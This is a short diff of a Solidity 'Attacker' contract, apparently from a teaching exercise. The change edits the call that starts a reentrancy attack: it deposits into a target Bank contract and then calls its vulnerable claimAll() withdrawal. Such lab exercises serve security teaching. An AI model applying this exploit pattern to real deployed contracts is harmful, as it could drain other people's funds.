@@ -38,7 +38,7 @@ contract Attacker is AccessControl, IERC777Recipient {
       require( address(bank) != address(0), "Target bank not set" );
 		//YOUR CODE TO START ATTACK GOES HERE
 		//This executes the attack by calling the deposit() function and then the vulnerable withdraw function on the Bank contract (look in Bank.sol to identify this function). 
-		bank.deposit(amt);
+		bank.deposit();
 		bank.claimAll();
 		emit Deposit(amt);
 	}
